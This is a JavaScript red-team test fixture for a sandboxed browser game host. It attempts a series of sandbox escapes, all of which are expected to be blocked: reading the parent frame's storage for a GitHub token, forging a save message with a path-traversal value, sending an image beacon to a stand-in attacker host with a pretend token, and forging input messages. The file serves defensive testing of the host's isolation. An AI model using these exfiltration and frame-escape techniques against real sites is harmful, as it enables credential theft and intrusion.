// ── game.js (red-team) ──────────────────────────────────────────────────────
// Deliberately hostile — attempts the work order's §1.5 acceptance checklist
// from inside a running game, using raw browser globals (not ctx) wherever a
// real attacker would, since ctx never restricts what JS in this realm CAN
// call, only what the host RECOGNIZES over postMessage. Every attempt must
// fail. Results land in ctx.state.redteam for test/play.spec.mjs to read.

export default function init( ctx ) {

	const { state } = ctx;
	state.redteam = {
		token: 'pending',
		ownStorage: 'pending',
		parentDom: 'pending',
		githubApi: 'pending',
		forgedSave: 'pending',
		imgBeacon: 'pending',
		cameraAccess: 'pending',
		siblingFrame: 'pending',
		forgedPoseInput: 'pending',
	};

	// 1. Read the host's GitHub token — the only conceivable path is via
	// window.parent's storage (the token never enters this frame at all).
	try { void window.parent.localStorage; state.redteam.token = 'leaked'; }
	catch { state.redteam.token = 'blocked'; }

	// 2. Read/write THIS frame's own storage — opaque origin, should also fail.
	try { window.localStorage.setItem( 'x', '1' ); state.redteam.ownStorage = 'leaked'; }
	catch { state.redteam.ownStorage = 'blocked'; }

	// 3. Reach window.parent's DOM, and attempt to navigate the top frame.
	// Whether the navigation attempt actually took effect is verified from
	// OUTSIDE this sandbox (test/play.spec.mjs checks the host page's own URL
	// never changed) — a successful navigation would tear down this very
	// frame before it could report anything, so it can't self-report that one.
	try { void window.parent.document; state.redteam.parentDom = 'leaked'; }
	catch { state.redteam.parentDom = 'blocked'; }
	try { window.top.location.href = 'https://example.invalid/evil'; } catch { /* blocked synchronously — fine either way */ }

	// 4. Call the GitHub API directly — no token is ever attached (this frame
	// never has one), and the sandbox's CSP connect-src doesn't list
	// api.github.com at all, so the request itself is refused before any of
	// that matters.
	fetch( 'https://api.github.com/user' )
		.then( () => { state.redteam.githubApi = 'reached'; } )
		.catch( () => { state.redteam.githubApi = 'blocked'; } );

	// 5. postMessage a forged "save" for a path outside this game's own repo —
	// via the raw `parent` global, bypassing ctx entirely, exactly how real
	// hostile code would. play.js must validate and reject this, never act on it.
	window.addEventListener( 'message', ( event ) => {

		const msg = event.data;
		if ( ! msg || msg.type !== 'strata:save-rejected' ) return;
		state.redteam.forgedSave = 'rejected';
		state.redteam.forgedSaveReason = msg.reason;

	} );
	window.parent.postMessage( { type: 'strata:save', path: '../../outside-repo/pwned.json', bytes: 42 }, '*' );

	// 6. Exfiltrate via an <img> beacon — a classic bypass for an exfil fix
	// that only locks down connect-src (fetch/XHR) and forgets img-src is
	// ALSO a network-capable channel. The target domain's actual reachability
	// is irrelevant to this check: CSP blocks the request before DNS/connect
	// ever happens, so the deciding signal is the browser's own
	// `securitypolicyviolation` event, not whether anything would have
	// answered on the other end.
	document.addEventListener( 'securitypolicyviolation', ( e ) => {

		if ( e.violatedDirective && e.violatedDirective.startsWith( 'img-src' ) ) state.redteam.imgBeacon = 'blocked';

	} );
	const beacon = new Image();
	beacon.onload = () => { state.redteam.imgBeacon = 'leaked'; };
	beacon.src = 'https://attacker.invalid/beacon.gif?exfil=' + encodeURIComponent( 'token=pretend-leaked-value' );

	// 7. Pose-input-provider work order §4 — the game sandbox gets NO camera
	// permission at all (only the posecaster sibling frame does, at its own
	// origin); getUserMedia must fail here regardless of which model/camera
	// a real device has.
	if ( navigator.mediaDevices && navigator.mediaDevices.getUserMedia ) {

		navigator.mediaDevices.getUserMedia( { video: true } )
			.then( () => { state.redteam.cameraAccess = 'leaked'; } )
			.catch( () => { state.redteam.cameraAccess = 'blocked'; } );

	} else state.redteam.cameraAccess = 'blocked'; // no mediaDevices API reachable at all — same outcome

	// 8. Reach the posecaster sibling frame or its contents — it's a SEPARATE
	// frame embedded by the HOST, never a child of this sandbox, so there's no
	// legitimate path to it. `window.parent.frames` itself is one of the
	// handful of properties the HTML spec allows reading cross-origin (it's
	// just an alias back to the same WindowProxy, same as `.length` — neither
	// throws, and neither one actually exposes anything) — the REAL test is
	// whether any of the host's own nested frames (the sibling posecaster
	// frame among them) yield readable content through that reference; a
	// cross-origin `.document` read on any of them must still throw.
	try {

		const n = window.parent.frames.length; // reading this never throws — not the actual check
		let reachedAny = false;
		for ( let i = 0; i < n; i ++ ) { void window.parent.frames[ i ].document; reachedAny = true; }
		state.redteam.siblingFrame = reachedAny ? 'leaked' : 'blocked';

	} catch { state.redteam.siblingFrame = 'blocked'; }

	// 9/10. Forge a strata:input posted to THIS frame itself (not from the
	// real host) — must never update ctx.input.pose(). The host->sandbox
	// trust check is IDENTITY-based (event.source === window.parent), which
	// rejects a self-post exactly the same way it would reject a post from
	// any other non-host origin — there is no separate code path for "wrong
	// origin" vs "not really the host" to bypass independently.
	const beforePose = ctx.input.pose();
	window.postMessage( { type: 'strata:input', provider: 'pose', channel: 'default', data: { t: Date.now(), pose: [ { name: 'FORGED', x: 0, y: 0, z: 0, score: 1 } ] } }, '*' );
	setTimeout( () => {

		state.redteam.forgedPoseInput = ctx.input.pose() === beforePose ? 'rejected' : 'leaked';

	}, 50 );

}
